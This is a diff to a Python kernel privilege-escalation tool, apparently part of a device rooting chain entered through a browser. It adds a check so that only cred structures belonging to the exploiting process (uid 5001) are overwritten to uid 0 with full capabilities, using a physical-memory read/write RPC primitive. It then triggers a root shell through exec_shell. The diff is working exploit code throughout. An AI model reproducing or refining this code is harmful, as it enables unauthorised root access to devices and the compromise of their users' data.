@@ -219,6 +219,29 @@ def patch_full(rpc, cred_phys):
     return uid == 0 and perm == 0x3FFFFFFFFF and eff == 0x3FFFFFFFFF
 
 
+def patch_ours(rpc, cred):
+    """Patch `cred` only if it is still OUR process's (uid 5001).
+
+    Mirrors the boot payload's v15 gate on the browser-lane side.  A cred that
+    already reads uid 0 is rooted - ours from an earlier pass, or the target of a
+    stale task pointer (init's, for one).  Writing it would touch memory that is
+    not ours for no gain, so it counts as "already done".  Returns True when the
+    cred needs no write or the write verified, False when it is not ours,
+    unreadable, or the write failed.
+    """
+    if not T._kernel_ptr(cred):
+        return False
+    try:
+        uid = rpc.read_u32(PHYS(cred) + 4)
+    except Exception:
+        return False
+    if uid == 0:
+        return True
+    if uid != 5001:
+        return False
+    return patch_full(rpc, cred)
+
+
 def root(rpc, do_exec=False):
     base = T.find_image_base(rpc)
     if base is None:
@@ -243,7 +266,7 @@ def root(rpc, do_exec=False):
         ok = True
         for c in {cred, real}:
             if T._kernel_ptr(c):
-                ok = patch_full(rpc, c) and ok
+                ok = patch_ours(rpc, c) and ok
         if ok:
             print("[+] uid patch applied: this process is now uid 0", flush=True)
             if do_exec:
@@ -456,7 +479,7 @@ def root_via_fork(rpc, do_exec=False):
             time.sleep(0.2)
             continue
 
-        patched = False
+        patched = already = False
         for parent in targets:
             for off in (O_CRED, O_REAL):
                 cred = rpc.read_u32(PHYS(parent) + off)
@@ -464,10 +487,30 @@ def root_via_fork(rpc, do_exec=False):
                     print(f"[-] skip {T.hexs(cred)} (not a cred)", flush=True)
                     continue
                 print(f"[+] task {T.hexs(parent)} cred={T.hexs(cred)}", flush=True)
+                try:
+                    uid = rpc.read_u32(PHYS(cred) + 4)
+                except Exception:
+                    uid = None
+                if uid == 0:
+                    # Ours from an earlier pass, or a stale pointer's target.
+                    # Never write it (payload v15 rule); keep scanning for ours.
+                    print(f"[-] {T.hexs(cred)} already uid 0 (nothing to write)",
+                          flush=True)
+                    already = True
+                    continue
+                if uid != 5001:
+                    print(f"[-] skip {T.hexs(cred)} (uid {uid}, not ours)", flush=True)
+                    continue
                 if patch_full(rpc, cred):
                     patched = True
         if patched:
             print("[+] parent cred patched: stub is uid 0 + full caps", flush=True)
+            if do_exec:
+                print("[*] sending EXEC", flush=True)
+                rpc.exec_shell()
+            return True
+        if already:
+            print("[+] stub cred already uid 0 - nothing written", flush=True)
             if do_exec:
                 print("[*] sending EXEC", flush=True)
                 rpc.exec_shell()
